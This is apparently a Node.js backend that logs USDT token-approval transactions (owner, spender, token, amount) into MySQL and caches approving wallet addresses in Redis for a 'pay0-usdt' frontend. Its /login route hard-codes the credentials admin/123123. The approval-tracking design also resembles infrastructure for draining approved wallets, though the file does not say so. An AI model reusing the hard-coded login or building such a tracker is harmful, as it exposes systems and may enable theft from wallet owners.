const http = require("http");
const jwt = require("jsonwebtoken");
const { createClient } = require("redis");
const auth = require("./middleware/auth");
const { insertApproval } = require("./models/approval");
const cfg = require("./config/config.js");

const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || "https://pay0-usdt.vercel.app";

let redisClient = null;

const createTableSql = `
CREATE TABLE IF NOT EXISTS approvals (
  id INT AUTO_INCREMENT PRIMARY KEY,
  chain VARCHAR(32) NOT NULL,
  tx_hash VARCHAR(128) NOT NULL,
  amount_usdt VARCHAR(64) NOT NULL,
  action VARCHAR(32) NOT NULL,
  token_address VARCHAR(128) NOT NULL,
  spender_address VARCHAR(128) NOT NULL,
  owner_address VARCHAR(128) NOT NULL,
  created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
);
`;

async function ensureTable() {
  console.log("query createTableSql");
  const mysql = require("mysql2/promise");
  const pool = await mysql.createPool({
    host: cfg.mysql.host,
    port: cfg.mysql.port,
    user: cfg.mysql.user,
    password: cfg.mysql.password,
    database: cfg.mysql.database,
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
  });
  await pool.execute(createTableSql);
  console.log("createTableSql done");
}

async function cacheApprovalToRedis(data) {
  try {
    if (!redisClient || !redisClient.isOpen) {
      return;
    }
    const chainKey = String(data.chain || "").toLowerCase();
    const owner = String(data.ownerAddress || "");
    if (!chainKey || !owner) {
      return;
    }
    const ownersKey = "usdt:owners:" + chainKey;
    const approvalKey = "usdt:approval:" + chainKey + ":" + owner;
    await redisClient.sAdd(ownersKey, owner);
    await redisClient.hSet(approvalKey, {
      chain: data.chain,
      tokenAddress: data.tokenAddress,
      spenderAddress: data.spenderAddress,
      ownerAddress: data.ownerAddress,
      lastTxHash: data.txHash,
      amountUsdt: data.amountUsdt,
      updatedAt: new Date().toISOString()
    });
  } catch (e) {
    console.error("cacheApprovalToRedis error", e.message);
  }
}

function readJsonBody(req) {
  return new Promise((resolve, reject) => {
    let data = "";
    req.on("data", (chunk) => {
      data += chunk;
      if (data.length > 1000000) {
        req.destroy();
        reject(new Error("payload too large"));
      }
    });
    req.on("end", () => {
      if (!data) {
        resolve({});
        return;
      }
      try {
        const json = JSON.parse(data);
        resolve(json);
      } catch (e) {
        reject(e);
      }
    });
    req.on("error", reject);
  });
}

async function handleApproval(req, res) {
  if (req.method !== "POST") {
    res.statusCode = 405;
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify({ error: "method not allowed" }));
    return;
  }

  let body;
  try {
    body = await readJsonBody(req);
  } catch (e) {
    res.statusCode = 400;
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify({ error: "invalid json" }));
    return;
  }

  const chain = String(body.chain || "").trim();
  const txHash = String(body.txHash || "").trim();
  const amountUsdt = String(body.amountUsdt || "").trim();
  const action = String(body.action || "").trim();
  const tokenAddress = String(body.tokenAddress || "").trim();
  const spenderAddress = String(body.spenderAddress || "").trim();
  const ownerAddress = String(body.ownerAddress || "").trim();

  
  if (!chain || !txHash || !amountUsdt || !action || !tokenAddress || !spenderAddress || !ownerAddress) {
    res.statusCode = 400;
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify({ error: "missing fields" }));
    return;
  }

  try {
    const approvalData = {
      chain,
      txHash,
      amountUsdt,
      action,
      tokenAddress,
      spenderAddress,
      ownerAddress
    };
    await insertApproval(approvalData);
    await cacheApprovalToRedis(approvalData);
    res.statusCode = 200;
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify({ ok: true }));
  } catch (e) {
    res.statusCode = 500;
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify({ error: "db error" }));
  }
}

const server = http.createServer(async (req, res) => {
  const origin = req.headers.origin;
  if (origin && origin === ALLOWED_ORIGIN) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Vary", "Origin");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  }

  if (req.method === "OPTIONS") {
    res.statusCode = 204;
    res.end();
    return;
  }

  if (req.url === "/api/approval") {
    let handled = false;
    await new Promise((resolve) => {
      auth(req, res, async function next() {
        handled = true;
        resolve();
      });
    });
    if (!handled) {
      return;
    }
    if (!req.user || (req.user.role && req.user.role !== "frontend")) {
      res.statusCode = 403;
      res.setHeader("Content-Type", "application/json");
      res.end(JSON.stringify({ error: "forbidden" }));
      return;
    }
    try {
      // await ensureTable();
      await handleApproval(req, res);
    } catch (e) {
      console.error("error in /api/approval handler", e);
      res.statusCode = 500;
      res.setHeader("Content-Type", "application/json");
      res.end(JSON.stringify({ error: "internal error" }));
    }
    return;
  }

  if (req.url === "/login") {
    try {
      const body = await readJsonBody(req);
      const username = String(body.username || "").trim();
      const password = String(body.password || "").trim();
      if (!username || !password) {
        res.statusCode = 400;
        res.setHeader("Content-Type", "application/json");
        res.end(JSON.stringify({ error: "missing fields" }));
        return;
      }
      if (username !== "admin" || password !== "123123") {
        res.statusCode = 401;
        res.setHeader("Content-Type", "application/json");
        res.end(JSON.stringify({ error: "unauthorized" }));
        return;
      }
      const token = jwt.sign({ role: "frontend" }, cfg.jwt.secret, { expiresIn: "7d" });
      res.statusCode = 200;
      res.setHeader("Content-Type", "application/json");
      res.end(JSON.stringify({ token }));
    } catch (e) {
      console.error("login error", e.message);
      res.statusCode = 500;
      res.setHeader("Content-Type", "application/json");
      res.end(JSON.stringify({ error: "internal error" }));
    }
    return;
  }

  res.statusCode = 404;
  res.setHeader("Content-Type", "application/json");
  res.end(JSON.stringify({ error: "not found" }));
});

(async () => {
  try {
    // await ensureTable();
    console.log("database init ok");
  } catch (e) {
    console.error("database init error", e);
  }
  server.listen(cfg.server.port, () => {
    console.log("server listening on port", cfg.server.port);
  });
})();
